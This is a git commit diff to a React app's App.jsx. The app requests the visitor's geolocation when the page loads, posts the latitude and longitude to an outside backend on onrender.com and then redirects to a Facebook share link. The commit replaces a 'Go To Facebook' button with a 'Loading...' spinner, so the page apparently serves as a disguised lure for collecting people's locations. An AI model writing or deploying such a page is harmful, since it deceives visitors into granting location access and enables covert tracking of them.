c354322248e2fd66b224bc96863a45e65a87d10f
MD Nazmul Hassan <160168720+nazmul910@users.noreply.github.com>
2025-05-28 11:17:04 +0600

    Loading

--- src/App.jsx
+++ src/App.jsx
@@ -1,51 +1,57 @@
 import { FaArrowRightLong } from "react-icons/fa6";
 import './App.css';
 import { useEffect } from "react";
-
+import { ClipLoader } from 'react-spinners';
 
 function App() {
 
 
-  const handleClick = () => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
+  const handleClick = async () => {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
 
-          fetch('https://loac-backend.onrender.com/location', {
+        try {
+          const response = await fetch('https://loac-backend.onrender.com/location', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ latitude, longitude }),
-          })
-            .then(response => response.json())
-            .then(data => {
-              console.log('Response from server:', data);
-            });
-        },
-        (error) => {
-          console.error('Error getting location:', error);
-        }
-      );
-    } else {
-      console.log("success");
-    }
-  };
+          });
 
-  useEffect(() =>{
-    handleClick();
-  },[])
+          const data = await response.json();
+          console.log('Response from server:', data);
+
+       
+          window.location.href = "https://www.facebook.com/share/p/1BeRQGnmAG/";
+        } catch (error) {
+          console.error('Error sending location to server:', error);
+        }
+      },
+      (error) => {
+        console.error('Error getting location:', error);
+      }
+    );
+  } else {
+    console.log("Geolocation not supported");
+  }
+};
+
+useEffect(() => {
+  handleClick();
+}, []);
 
   return (
-    <div className="h-lvh flex flex-col justify-center items-center space-y-4">
+    <div className="h-lvh flex justify-center items-center">
      
 
-      <a href="https://www.facebook.com/share/p/1Bnni7kkpR/" className=" absolute z-0">
+      <a href="https://www.facebook.com/share/p/1BeRQGnmAG/" className=" absolute z-0">
         <button
-          className="flex items-center border gap-2 px-3 font-thin"
+          className="flex items-center  gap-2"
           onClick={handleClick}
         >
-          Go To Facebook <FaArrowRightLong />
+          <p className="font-bold text-xl">Loading...</p> <ClipLoader height="30" width="30" color="black" ariaLabel="loading" />
         </button>
       </a>
     </div>
